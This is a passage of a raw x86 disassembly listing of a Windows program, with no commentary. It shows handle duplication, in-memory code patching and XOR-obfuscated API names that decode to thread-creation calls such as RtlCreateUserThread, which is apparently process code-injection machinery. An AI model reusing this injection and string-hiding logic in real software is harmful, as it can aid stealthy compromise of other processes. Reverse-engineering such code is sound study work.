		test	ebx, ebx
		jz	loc_40B8B5
		cmp	ebx, 0FFFFFFFFh
		jz	loc_40B8B5
		push	ebx		; hSourceHandle
		call	sub_40BB64
		mov	[ebp+var_8], eax
		cmp	[ebp+var_8], 0
		jz	loc_40B8A9
		call	sub_409B20
		cmp	eax, [ebp+var_8]
		jz	loc_40B8A9
		mov	eax, [ebp+var_8]
		call	sub_40B3BC
		test	al, al
		jnz	loc_40B8A9
		push	78h		; dwErrCode
		call	SetLastError
		call	sub_409B20
		xor	[ebp+var_8], eax
		lea	eax, [ebp+var_8]
		mov	[ebp+var_C], eax
		mov	eax, offset dword_40BAF4
		call	sub_409880
		lea	edx, [ebp+var_88]
		call	sub_4097C0
		mov	eax, [ebp+var_6C]
		call	sub_40455C
		cmp	eax, 7
		jl	loc_40BAA2
		mov	eax, [ebp+var_6C]
		call	sub_404564
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_6C]
		mov	eax, [edx+eax*8-0C0h]
		lea	edx, [ebp+var_120]
		call	sub_4097C0
		lea	edx, [ebp+var_120]
		lea	eax, [ebp+var_88]
		mov	ecx, off_407188
		call	sub_4041F8
		cmp	[ebp+var_7C], 0C8h
		jge	loc_40BAA2
		mov	eax, [ebp+var_68]
		call	sub_40455C
		cmp	eax, 5
		jl	loc_40BAA2
		mov	eax, [ebp+var_68]
		call	sub_404564
		mov	edx, eax
		shl	eax, 3
		sub	eax, edx
		mov	edx, [ebp+var_68]
		mov	ebx, [edx+eax*4+0Ch]
		mov	eax, [ebp+var_68]
		call	sub_404564
		mov	edx, eax
		shl	eax, 3
		sub	eax, edx
		mov	edx, [ebp+var_68]
		cmp	ebx, [edx+eax*4-10h]
		jnz	loc_40BAA2
		mov	eax, [ebp+var_84]
		mov	[ebp+var_10], eax
		mov	eax, [ebp+var_68]
		call	sub_404564
		mov	edx, eax
		shl	eax, 3
		sub	eax, edx
		mov	edx, [ebp+var_68]
		mov	eax, [edx+eax*4-2Ch]
		lea	edx, [ebp+var_160]
		call	sub_4097C0
		lea	edx, [ebp+var_160]
		lea	eax, [ebp+var_88]
		mov	ecx, off_407188
		call	sub_4041F8
		cmp	[ebp+var_7C], 1F4h
		jge	loc_40BAA2
		lea	eax, [ebp+var_88]
		call	sub_40B2E4
		test	eax, eax
		jz	loc_40BAA2
		push	0
		push	0
		xor	ecx, ecx
		xor	edx, edx
		mov	eax, [ebp+var_84]
		call	sub_40AB44
		mov	[ebp+var_14], eax
		xor	edx, edx
		push	ebp
		push	offset loc_40B8A2
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		lea	edx, [ebp+var_88]
		mov	eax, [ebp+var_14]
		call	sub_4097C0
		lea	eax, [ebp+var_88]
		call	sub_40B2E4
		test	eax, eax
		jz	loc_40B889
		lea	edx, [ebp+var_C]
		mov	[eax], edx
		push	0
		push	0
		xor	ecx, ecx
		xor	edx, edx
		mov	eax, [ebp+var_10]
		call	sub_40AB44
		mov	[ebp+var_20], eax
		xor	edx, edx
		push	ebp
		push	offset loc_40B882
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		lea	edx, [ebp+var_88]
		mov	eax, [ebp+var_20]
		call	sub_4097C0
		mov	eax, [ebp+var_68]
		call	sub_404564
		mov	edx, eax
		shl	eax, 3
		sub	eax, edx
		mov	edx, [ebp+var_68]
		lea	esi, [edx+eax*4-38h]
		mov	eax, [ebp+var_14]
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [esi+8]
		xor	edx, edx
		sub	[esp+1BCh+var_1BC], eax
		sbb	[esp+1BCh+var_1B8], edx
		pop	eax
		pop	edx
		mov	edx, [esi+14h]
		mov	[edx], eax
		mov	eax, [ebp+var_6C]
		call	sub_404564
		test	eax, eax
		jl	short loc_40B6BD
		inc	eax
		mov	[ebp+var_48], eax
		xor	ebx, ebx

loc_40B67F:				; CODE XREF: sub_40B410+2ABj
		mov	eax, ebx
		add	eax, eax
		lea	eax, [eax+eax*2]
		mov	edx, [ebp+var_6C]
		mov	edx, [edx+eax*8]
		cmp	edx, [esi+4]
		jnb	short loc_40B6B7
		mov	edx, [ebp+var_6C]
		mov	edx, [edx+eax*8+4]
		cmp	edx, [esi+4]
		jbe	short loc_40B6B7
		mov	edx, [ebp+var_6C]
		mov	edx, [edx+eax*8]
		cmp	word ptr [edx],	86Ah
		jnz	short loc_40B6B7
		mov	edx, [ebp+var_6C]
		mov	eax, [edx+eax*8]
		mov	word ptr [eax],	186Ah
		jmp	short loc_40B6BD
; ---------------------------------------------------------------------------

loc_40B6B7:				; CODE XREF: sub_40B410+27Fj
					; sub_40B410+28Bj ...
		inc	ebx
		dec	[ebp+var_48]
		jnz	short loc_40B67F

loc_40B6BD:				; CODE XREF: sub_40B410+267j
					; sub_40B410+2A5j
		cmp	[ebp+arg_8], 0
		jnz	short loc_40B6CC
		mov	[ebp+arg_8], 0FFFFD000h
		jmp	short loc_40B6D5
; ---------------------------------------------------------------------------

loc_40B6CC:				; CODE XREF: sub_40B410+2B1j
		cmp	[ebp+arg_8], 0
		jle	short loc_40B6D5
		neg	[ebp+arg_8]

loc_40B6D5:				; CODE XREF: sub_40B410+2BAj
					; sub_40B410+2C0j
		push	0
		push	14h
		call	sub_40A770
		mov	[ebp+var_3C], eax
		mov	eax, [ebp+var_3C]
		mov	edx, [ebp+arg_C]
		mov	[eax], edx
		mov	eax, [ebp+var_3C]
		mov	edx, [ebp+arg_10]
		mov	[eax+4], edx
		xor	eax, eax
		mov	[ebp+nLengthNeeded], eax
		xor	eax, eax
		mov	[ebp+hObject], eax
		mov	eax, offset dword_40BB0C
		call	sub_409880
		lea	edx, [ebp+var_B8]
		call	sub_408610
		mov	ebx, 0Ah

loc_40B716:				; CODE XREF: sub_40B410+358j
		cmp	[ebp+var_B6], 0A1h
		jnz	short loc_40B741
		cmp	[ebp+nLengthNeeded], 0
		jz	short loc_40B735
		mov	eax, [ebp+var_9C]
		inc	eax
		mov	eax, [eax]
		mov	[ebp+hObject], eax
		jmp	short loc_40B76A
; ---------------------------------------------------------------------------

loc_40B735:				; CODE XREF: sub_40B410+315j
		mov	eax, [ebp+var_9C]
		inc	eax
		mov	eax, [eax]
		mov	[ebp+nLengthNeeded], eax

loc_40B741:				; CODE XREF: sub_40B410+30Fj
		lea	edx, [ebp+var_184]
		mov	eax, [ebp+var_98]
		call	sub_408610
		push	edi
		lea	esi, [ebp+var_184]
		lea	edi, [ebp+var_B8]
		mov	ecx, 9
		rep movsd
		pop	edi
		dec	ebx
		jnz	short loc_40B716

loc_40B76A:				; CODE XREF: sub_40B410+323j
		cmp	[ebp+nLengthNeeded], 0
		jnz	short loc_40B776
		cmp	[ebp+hObject], 0
		jz	short loc_40B7C6

loc_40B776:				; CODE XREF: sub_40B410+35Ej
		call	sub_4097D4
		mov	edx, 61h
		call	sub_406B50
		mov	[ebp+var_40], eax
		call	sub_4097D4
		mov	edx, 62h
		call	sub_406B50
		mov	[ebp+var_44], eax
		cmp	[ebp+var_40], 0
		jz	short loc_40B7D0
		cmp	[ebp+var_44], 0
		jz	short loc_40B7D0
		cmp	[ebp+nLengthNeeded], 0
		jz	short loc_40B7B5
		mov	eax, [ebp+nLengthNeeded]
		mov	eax, [eax]
		push	eax
		call	[ebp+var_40]

loc_40B7B5:				; CODE XREF: sub_40B410+39Aj
		cmp	[ebp+hObject], 0
		jz	short loc_40B7D0
		mov	eax, [ebp+hObject]
		mov	eax, [eax]
		push	eax
		call	[ebp+var_40]
		jmp	short loc_40B7D0
; ---------------------------------------------------------------------------

loc_40B7C6:				; CODE XREF: sub_40B410+364j
		xor	eax, eax
		mov	[ebp+var_40], eax
		xor	eax, eax
		mov	[ebp+var_44], eax

loc_40B7D0:				; CODE XREF: sub_40B410+38Ej
					; sub_40B410+394j ...
		xor	eax, eax
		push	ebp
		push	offset loc_40B851
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_10]
		mov	eax, [ebp+var_3C]
		add	eax, 8
		call	sub_40AF50
		test	al, al
		jz	short loc_40B819
		mov	eax, [ebp+var_8]
		add	eax, 20h
		test	dword ptr [eax], 30800000h
		jnz	short loc_40B819
		mov	eax, [ebp+arg_18]
		push	eax
		mov	eax, [ebp+arg_14]
		push	eax
		mov	eax, [ebp+var_3C]
		push	eax
		mov	eax, [ebp+var_10]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		push	edi
		call	[ebp+var_20]
		mov	[ebp+var_4], eax

loc_40B819:				; CODE XREF: sub_40B410+3DEj
					; sub_40B410+3ECj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40B858

loc_40B826:				; CODE XREF: sub_40B410+446j
		cmp	[ebp+var_40], 0
		jz	short locret_40B850
		cmp	[ebp+var_44], 0
		jz	short locret_40B850
		cmp	[ebp+hObject], 0
		jz	short loc_40B841
		mov	eax, [ebp+hObject]
		mov	eax, [eax]
		push	eax
		call	[ebp+var_44]

loc_40B841:				; CODE XREF: sub_40B410+426j
		cmp	[ebp+nLengthNeeded], 0
		jz	short locret_40B850
		mov	eax, [ebp+nLengthNeeded]
		mov	eax, [eax]
		push	eax
		call	[ebp+var_44]

locret_40B850:				; CODE XREF: sub_40B410+41Aj
					; sub_40B410+420j ...
		retn
; ---------------------------------------------------------------------------

loc_40B851:				; DATA XREF: sub_40B410+3C3o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40B826
; ---------------------------------------------------------------------------

loc_40B858:				; DATA XREF: sub_40B410+411o
		cmp	[ebp+var_4], 0
		jnz	short loc_40B869
		push	0
		mov	eax, [ebp+var_3C]
		push	eax
		call	sub_40A890

loc_40B869:				; CODE XREF: sub_40B410+44Cj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40B889

loc_40B876:				; CODE XREF: sub_40B410+477j
		push	0
		mov	eax, [ebp+var_20]
		push	eax
		call	sub_40A890
		retn
; ---------------------------------------------------------------------------

loc_40B882:				; DATA XREF: sub_40B410+214o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40B876
; ---------------------------------------------------------------------------

loc_40B889:				; CODE XREF: sub_40B410+1F3j
					; sub_40B410+471j
					; DATA XREF: ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40BAA2

loc_40B896:				; CODE XREF: sub_40B410+497j
		push	0
		mov	eax, [ebp+var_14]
		push	eax
		call	sub_40A890
		retn
; ---------------------------------------------------------------------------

loc_40B8A2:				; DATA XREF: sub_40B410+1CDo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40B896
; ---------------------------------------------------------------------------

loc_40B8A9:				; CODE XREF: sub_40B410+6Bj
					; sub_40B410+79j ...
		push	57h		; dwErrCode
		call	SetLastError
		jmp	loc_40BAA2
; ---------------------------------------------------------------------------

loc_40B8B5:				; CODE XREF: sub_40B410+4Fj
					; sub_40B410+58j
		push	57h		; dwErrCode
		call	SetLastError
		jmp	loc_40BAA2
; ---------------------------------------------------------------------------

loc_40B8C1:				; CODE XREF: sub_40B410+47j
		xor	esi, esi
		test	edi, edi
		jnz	loc_40B95B
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		lea	eax, [ebp+hObject]
		push	eax		; lpTargetHandle
		call	GetCurrentProcess
		push	eax		; hTargetProcessHandle
		call	GetCurrentThread
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		test	eax, eax
		jz	short loc_40B95B
		xor	eax, eax
		mov	[ebp+nLengthNeeded], eax
		lea	eax, [ebp+nLengthNeeded]
		push	eax		; lpnLengthNeeded
		push	0		; nLength
		push	0		; pSecurityDescriptor
		push	4		; RequestedInformation
		mov	eax, [ebp+hObject]
		push	eax		; Handle
		call	GetKernelObjectSecurity
		cmp	[ebp+nLengthNeeded], 0
		jbe	short loc_40B952
		mov	eax, [ebp+nLengthNeeded]
		add	eax, eax
		call	sub_402520
		mov	esi, eax
		lea	eax, [ebp+nLengthNeeded]
		push	eax		; lpnLengthNeeded
		mov	eax, [ebp+nLengthNeeded]
		add	eax, eax
		push	eax		; nLength
		push	esi		; pSecurityDescriptor
		push	4		; RequestedInformation
		mov	eax, [ebp+hObject]
		push	eax		; Handle
		call	GetKernelObjectSecurity
		test	eax, eax
		jz	short loc_40B952
		mov	[ebp+var_94], 0Ch
		mov	[ebp+var_90], esi
		xor	eax, eax
		mov	[ebp+var_8C], eax
		lea	edi, [ebp+var_94]

loc_40B952:				; CODE XREF: sub_40B410+4FCj
					; sub_40B410+522j
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40B95B:				; CODE XREF: sub_40B410+4B5j
					; sub_40B410+4DEj
		call	sub_409EB0
		call	GetCurrentProcessId
		call	sub_40B36C
		mov	[ebp+nLengthNeeded], eax
		push	ebx		; hSourceHandle
		call	sub_40BB64
		call	sub_40B36C
		cmp	eax, [ebp+nLengthNeeded]
		jz	loc_40BA7C
		mov	eax, offset dword_40BB28
		call	sub_409978
		mov	[ebp+var_2C], eax
		cmp	[ebp+var_2C], 0
		jz	loc_40BA9B
		test	edi, edi
		jz	short loc_40B9A4
		mov	eax, [edi+4]
		mov	[ebp+var_30], eax
		jmp	short loc_40B9A9
; ---------------------------------------------------------------------------

loc_40B9A4:				; CODE XREF: sub_40B410+58Aj
		xor	eax, eax
		mov	[ebp+var_30], eax

loc_40B9A9:				; CODE XREF: sub_40B410+592j
		xor	eax, eax
		mov	[ebp+var_34], eax
		xor	eax, eax
		mov	[ebp+var_38], eax
		cmp	[ebp+arg_8], 0
		jz	short loc_40B9CD
		test	byte ptr [ebp+arg_14+2], 1
		jz	short loc_40B9C7
		lea	eax, [ebp+arg_8]
		mov	[ebp+var_34], eax
		jmp	short loc_40B9CD
; ---------------------------------------------------------------------------

loc_40B9C7:				; CODE XREF: sub_40B410+5ADj
		lea	eax, [ebp+arg_8]
		mov	[ebp+var_38], eax

loc_40B9CD:				; CODE XREF: sub_40B410+5A7j
					; sub_40B410+5B5j
		push	ebx
		push	25h
		call	sub_40A770
		mov	edi, eax
		test	edi, edi
		jz	loc_40BA9B
		push	esi
		push	edi
		mov	esi, offset dword_4169BC
		lea	edi, [ebp+var_DD]
		mov	ecx, 9
		rep movsd
		movsb
		pop	edi
		pop	esi
		mov	eax, [ebp+arg_C]
		mov	[ebp+var_D8], eax
		mov	[ebp+var_C8], edi
		mov	eax, offset dword_40BB44
		call	sub_409880
		mov	[ebp+var_C3], eax
		mov	eax, offset dword_40BB58
		call	sub_409880
		mov	[ebp+var_BE], eax
		lea	eax, [ebp+hObject]
		push	eax
		push	25h
		lea	eax, [ebp+var_DD]
		push	eax
		push	edi
		push	ebx
		call	ds:dword_416958
		test	eax, eax
		jz	short loc_40BA73
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+nLengthNeeded]
		push	eax
		mov	eax, [ebp+arg_10]
		push	eax
		push	edi
		mov	eax, [ebp+var_38]
		push	eax
		mov	eax, [ebp+var_34]
		push	eax
		push	0
		push	0
		mov	eax, [ebp+var_30]
		push	eax
		push	ebx
		call	[ebp+var_2C]
		test	eax, eax
		jl	short loc_40BA73
		mov	eax, [ebp+nLengthNeeded]
		mov	[ebp+var_4], eax
		mov	eax, [ebp+arg_18]
		mov	edx, [ebp+var_24]
		mov	[eax], edx
		jmp	short loc_40BA9B
; ---------------------------------------------------------------------------

loc_40BA73:				; CODE XREF: sub_40B410+62Cj
					; sub_40B410+651j
		push	ebx
		push	edi
		call	sub_40A890
		jmp	short loc_40BA9B
; ---------------------------------------------------------------------------

loc_40BA7C:				; CODE XREF: sub_40B410+56Bj
		mov	eax, [ebp+arg_18]
		push	eax
		mov	eax, [ebp+arg_14]
		push	eax
		mov	eax, [ebp+arg_10]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		push	edi
		push	ebx
		call	ds:dword_416964
		mov	[ebp+var_4], eax

loc_40BA9B:				; CODE XREF: sub_40B410+582j
					; sub_40B410+5C9j ...
		mov	eax, esi
		call	sub_402540

loc_40BAA2:				; CODE XREF: sub_40B410+C4j
					; sub_40B410+10Aj ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40BADE

loc_40BAAF:				; CODE XREF: sub_40B410+6CCj
		lea	eax, [ebp+var_160]
		mov	edx, off_407188
		mov	ecx, 2
		call	sub_4040E8
		lea	eax, [ebp+var_88]
		mov	edx, off_407188
		call	sub_40409C
		retn
; ---------------------------------------------------------------------------

loc_40BAD7:				; DATA XREF: sub_40B410+2Do
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40BAAF
; ---------------------------------------------------------------------------

loc_40BADE:				; CODE XREF: sub_40B410+6C6j
					; DATA XREF: sub_40B410+69Ao
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	1Ch
sub_40B410	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ch
dword_40BAF4	dd 34302716h, 3D013021h, 31343027h, 0 ;	DATA XREF: sub_40B410+A4o
		dd 0FFFFFFFFh, 12h
dword_40BB0C	dd 20373011h, 21361432h, 530233Ch, 30363A27h, 2626h, 0FFFFFFFFh
					; DATA XREF: sub_40B410+2ECo
		dd 13h
dword_40BB28	dd 16392107h, 21343027h, 30260030h, 273D0127h, 313430h
					; DATA XREF: sub_40B410+571o
		dd 0FFFFFFFFh, 0Ah
dword_40BB44	dd 213C2D10h, 30273D01h, 3134h,	0FFFFFFFFh, 0Bh	; DATA XREF: sub_40B410+5F5o
dword_40BB58	dd 21273C03h, 13393420h, 303027h ; DATA	XREF: sub_40B410+605o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_40BB64(HANDLE hSourceHandle)
sub_40BB64	proc near		; CODE XREF: sub_40B410+5Fp
					; sub_40B410+55Ep ...

var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_20		= byte ptr -20h
var_10		= dword	ptr -10h
hObject		= dword	ptr -8
var_4		= dword	ptr -4
hSourceHandle	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE0h
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+var_4], eax
		call	GetVersion_0
		test	eax, 80000000h
		jz	loc_40BC52
		xor	eax, eax
		push	ebp
		push	offset loc_40BBAB
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		call	GetCurrentProcessId
		mov	ebx, eax
		call	sub_409B20
		xor	ebx, eax
		mov	ebx, [ebx+44h]
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_40BBB7
; ---------------------------------------------------------------------------

loc_40BBAB:				; DATA XREF: sub_40BB64+21o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	ebx, ebx
		call	sub_4033E8

loc_40BBB7:				; CODE XREF: sub_40BB64+45j
		test	ebx, ebx
		jz	loc_40BCEE
		call	sub_409BE8
		test	al, al
		jz	short loc_40BBCD
		mov	esi, [ebp+hSourceHandle]
		jmp	short loc_40BBD3
; ---------------------------------------------------------------------------

loc_40BBCD:				; CODE XREF: sub_40BB64+62j
		mov	esi, [ebp+hSourceHandle]
		shr	esi, 2

loc_40BBD3:				; CODE XREF: sub_40BB64+67j
		mov	eax, esi
		xor	edx, edx
		push	edx
		push	eax
		mov	eax, [ebx]
		cdq
		cmp	edx, [esp+34h+var_30]
		jnz	short loc_40BBEB
		cmp	eax, [esp+34h+var_34]
		pop	edx
		pop	eax
		jbe	short loc_40BC46
		jmp	short loc_40BBEF
; ---------------------------------------------------------------------------

loc_40BBEB:				; CODE XREF: sub_40BB64+7Cj
		pop	edx
		pop	eax
		jle	short loc_40BC46

loc_40BBEF:				; CODE XREF: sub_40BB64+85j
		xor	eax, eax
		push	ebp
		push	offset loc_40BC32
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	edi, [ebx+esi*8+8]
		test	edi, edi
		jz	short loc_40BC25
		call	GetCurrentProcessId
		push	eax
		call	sub_409B20
		pop	edx
		xor	edx, eax
		mov	al, [edx]
		cmp	al, [edi]
		jnz	short loc_40BC25
		call	sub_409B20
		xor	eax, [ebx+esi*8+8]
		mov	[ebp+var_4], eax

loc_40BC25:				; CODE XREF: sub_40BB64+9Fj
					; sub_40BB64+B3j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	loc_40BCEE
; ---------------------------------------------------------------------------

loc_40BC32:				; DATA XREF: sub_40BB64+8Eo
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		xor	eax, eax
		mov	[ebp+var_4], eax
		call	sub_4033E8
		jmp	loc_40BCEE
; ---------------------------------------------------------------------------

loc_40BC46:				; CODE XREF: sub_40BB64+83j
					; sub_40BB64+89j
		push	57h		; dwErrCode
		call	SetLastError
		jmp	loc_40BCEE
; ---------------------------------------------------------------------------

loc_40BC52:				; CODE XREF: sub_40BB64+18j
		push	0		; dwOptions
		push	0		; bInheritHandle
		push	400h		; dwDesiredAccess
		lea	eax, [ebp+hObject]
		push	eax		; lpTargetHandle
		call	GetCurrentProcess
		push	eax		; hTargetProcessHandle
		mov	eax, [ebp+hSourceHandle]
		push	eax		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		test	eax, eax
		jnz	short loc_40BC7E
		mov	eax, [ebp+hSourceHandle]
		mov	[ebp+hObject], eax

loc_40BC7E:				; CODE XREF: sub_40BB64+112j
		lea	eax, [ebp+var_20]
		mov	edx, 18h
		call	sub_405424
		cmp	ds:dword_4169E4, 0
		jnz	short loc_40BCA3
		mov	eax, offset dword_40BD04
		call	sub_409978
		mov	ds:dword_4169E4, eax

loc_40BCA3:				; CODE XREF: sub_40BB64+12Ej
		cmp	ds:dword_4169E4, 0
		jz	short loc_40BCD6
		push	0
		push	18h
		lea	eax, [ebp+var_20]
		push	eax
		push	0
		mov	eax, [ebp+hObject]
		push	eax
		call	ds:dword_4169E4
		mov	esi, eax
		test	esi, esi
		jnz	short loc_40BCCE
		mov	eax, [ebp+var_10]
		mov	[ebp+var_4], eax
		jmp	short loc_40BCDD
; ---------------------------------------------------------------------------

loc_40BCCE:				; CODE XREF: sub_40BB64+160j
		push	esi		; dwErrCode
		call	SetLastError
		jmp	short loc_40BCDD
; ---------------------------------------------------------------------------

loc_40BCD6:				; CODE XREF: sub_40BB64+146j
		push	78h		; dwErrCode
		call	SetLastError

loc_40BCDD:				; CODE XREF: sub_40BB64+168j
					; sub_40BB64+170j
		mov	eax, [ebp+hObject]
		cmp	eax, [ebp+hSourceHandle]
		jz	short loc_40BCEE
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40BCEE:				; CODE XREF: sub_40BB64+55j
					; sub_40BB64+C9j ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	4
sub_40BB64	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 19h
dword_40BD04	dd 2004211Bh, 1C2C2730h, 273A333Bh, 3C213438h, 27053B3Ah
					; DATA XREF: sub_40BB64+130o
		dd 2630363Ah, 26h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40BD20	proc near		; DATA XREF: CODE:00415BC8o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_40BD45
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_4176B8
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40BD4C

loc_40BD44:				; CODE XREF: sub_40BD20+2Aj
		retn
; ---------------------------------------------------------------------------

loc_40BD45:				; DATA XREF: sub_40BD20+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40BD44
; ---------------------------------------------------------------------------

loc_40BD4C:				; CODE XREF: sub_40BD20:loc_40BD44j
					; DATA XREF: sub_40BD20+1Fo
		pop	ebp
		retn
sub_40BD20	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_40BD50	proc near		; DATA XREF: CODE:00415BC4o
		sub	ds:dword_4176B8, 1
		retn
sub_40BD50	endp


; =============== S U B	R O U T	I N E =======================================


sub_40BD58	proc near		; CODE XREF: sub_410970+45p
		cmp	ds:dword_4169FC, 0
		jnz	locret_40BEDC
		mov	eax, offset dword_40BEE8
		call	sub_409880
		mov	ds:dword_4169FC, eax
		mov	eax, offset dword_40BF04
		call	sub_409880
		mov	ds:dword_416A00, eax
		mov	eax, offset dword_40BF20
		call	sub_409880
		mov	ds:dword_4169EC, eax
		mov	eax, offset dword_40BF38
		call	sub_409880
		mov	ds:dword_4169F0, eax
		mov	eax, offset dword_40BF50
		call	sub_409880
		mov	ds:dword_4169F4, eax
		mov	eax, offset dword_40BF68
		call	sub_409880
		mov	ds:dword_4169F8, eax
		mov	eax, offset dword_40BF7C
		call	sub_409880
		mov	ds:dword_416A04, eax
		mov	eax, offset dword_40BF94
		call	sub_409880
		mov	ds:dword_416A08, eax
		mov	eax, offset dword_40BFA8
		call	sub_409880
		mov	ds:dword_416A0C, eax
		mov	eax, offset dword_40BFBC
		call	sub_409880
		mov	ds:dword_416A10, eax
		mov	eax, offset dword_40BFD4
		call	sub_409880
		mov	ds:dword_416A14, eax
		mov	eax, offset dword_40BFF0
		call	sub_409880
		mov	ds:dword_416A18, eax
		mov	eax, offset dword_40C00C
		call	sub_409880
		mov	ds:dword_416A1C, eax
		mov	eax, offset dword_40C028
		call	sub_409880
		mov	ds:dword_416A20, eax
		mov	eax, offset dword_40C044
		call	sub_409880
		mov	ds:dword_416A24, eax
		mov	eax, offset dword_40C05C
		call	sub_409880
		mov	ds:dword_416A28, eax
		mov	eax, offset dword_40C074
		call	sub_409880
		mov	ds:dword_416A2C, eax
		mov	eax, offset dword_40C08C
		call	sub_409880
		mov	ds:dword_416A30, eax
		mov	eax, offset dword_40C0A0
		call	sub_409880
		mov	ds:dword_416A34, eax
		mov	eax, offset dword_40C0B8
		call	sub_409880
		mov	ds:dword_416A38, eax
		mov	eax, offset dword_40C0D0
		call	sub_409880
		mov	ds:dword_416A3C, eax
		mov	eax, offset dword_40C0E4
		call	sub_409880
		mov	ds:dword_416A40, eax
		mov	eax, offset dword_40C0F8
		call	sub_409880
		mov	ds:dword_416A44, eax
		mov	eax, offset dword_40C110
		call	sub_409880
		mov	ds:dword_416A48, eax
		mov	eax, offset dword_40C120
		call	sub_409880
		mov	ds:dword_416A4C, eax

locret_40BEDC:				; CODE XREF: sub_40BD58+7j
		retn
sub_40BD58	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 10h
dword_40BEE8	dd 18213012h, 3920313Ah, 3B341D30h, 14303931h, 0 ; DATA	XREF: sub_40BD58+Do
		dd 0FFFFFFFFh, 10h
dword_40BF04	dd 18213012h, 3920313Ah, 3B341D30h, 2303931h, 0	; DATA XREF: sub_40BD58+1Co
		dd 0FFFFFFFFh, 0Ch
dword_40BF20	dd 10213006h, 273A2727h, 30313A18h, 0 ;	DATA XREF: sub_40BD58+2Bo
		dd 0FFFFFFFFh, 0Ch
dword_40BF38	dd 31343A19h, 27373C19h, 142C2734h, 0 ;	DATA XREF: sub_40BD58+3Ao
		dd 0FFFFFFFFh, 0Ch
dword_40BF50	dd 31343A19h, 27373C19h, 22C2734h, 0 ; DATA XREF: sub_40BD58+49o
		dd 0FFFFFFFFh, 0Bh
dword_40BF68	dd 30302713h, 27373C19h, 2C2734h, 0FFFFFFFFh, 0Ch
					; DATA XREF: sub_40BD58+58o
dword_40BF7C	dd 19213012h, 10212634h, 273A2727h, 0 ;	DATA XREF: sub_40BD58+67o
		dd 0FFFFFFFFh, 0Bh
dword_40BF94	dd 21273C03h, 13393420h, 303027h, 0FFFFFFFFh, 0Ah
					; DATA XREF: sub_40BD58+76o
dword_40BFA8	dd 3213012h, 3C262730h,	3B3Ah, 0FFFFFFFFh, 0Ch ; DATA XREF: sub_40BD58+85o
dword_40BFBC	dd 34302716h, 20183021h, 142D3021h, 0 ;	DATA XREF: sub_40BD58+94o
		dd 0FFFFFFFFh, 12h
dword_40BFD4	dd 18213012h, 3920313Ah, 393C1330h, 38341B30h, 1430h, 0FFFFFFFFh
					; DATA XREF: sub_40BD58+A3o
		dd 13h
dword_40BFF0	dd 213C3402h, 6273A13h,	39323B3Ch, 3F371A30h, 213630h
					; DATA XREF: sub_40BD58+B2o
		dd 0FFFFFFFFh, 13h
dword_40C00C	dd 16213012h, 30272720h, 2705213Bh, 2630363Ah, 311C26h
					; DATA XREF: sub_40BD58+C1o
		dd 0FFFFFFFFh, 10h
dword_40C028	dd 3B30251Ah, 30393C13h, 25253418h, 14323B3Ch, 0 ; DATA	XREF: sub_40BD58+D0o
		dd 0FFFFFFFFh, 0Dh
dword_40C044	dd 3253418h, 1A22303Ch,	393C1333h, 30h,	0FFFFFFFFh, 0Eh
					; DATA XREF: sub_40BD58+DFo
dword_40C05C	dd 25383A16h, 6302734h,	3B3C2721h, 1432h, 0FFFFFFFFh, 0Fh
					; DATA XREF: sub_40BD58+EEo
dword_40C074	dd 34383B00h, 303C0325h, 13331A22h, 30393Ch, 0FFFFFFFFh
